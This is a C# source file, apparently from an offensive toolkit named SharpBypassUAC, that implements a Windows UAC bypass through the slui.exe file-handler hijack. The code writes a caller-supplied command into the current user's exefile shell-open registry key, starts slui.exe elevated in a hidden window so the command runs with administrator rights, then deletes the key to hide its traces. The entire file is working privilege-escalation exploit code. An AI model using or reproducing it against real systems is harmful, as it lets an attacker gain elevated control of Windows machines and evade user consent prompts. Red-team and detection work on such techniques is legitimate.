using System;
using System.Threading;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;

namespace SharpBypassUAC
{
    public class Slui
    {
        public Slui (byte[] encodedCommand)
        {
            //Credit: https://bytecode77.com/hacking/exploits/uac-bypass/slui-file-handler-hijack-privilege-escalation

            //Check if UAC is set to 'Always Notify'
            AlwaysNotify alwaysnotify = new AlwaysNotify();

            //Convert encoded command to a string
            string command = Encoding.UTF8.GetString(encodedCommand);

            //Set the registry key for eventvwr
            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"exefile\Shell\Open\command");

            RegistryKey sluikey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\exefile\Shell\Open\command", true);
            sluikey.SetValue("", @command);
            sluikey.Close();

            //start fodhelper
            Process p = new Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = "C:\\windows\\system32\\slui.exe";
            p.StartInfo.Verb = "runas";
            p.Start();

            //sleep 10 seconds to let the payload execute
            Thread.Sleep(10000);

            //Unset the registry
            newkey.DeleteSubKeyTree("exefile");
            return;
        }
    }
}
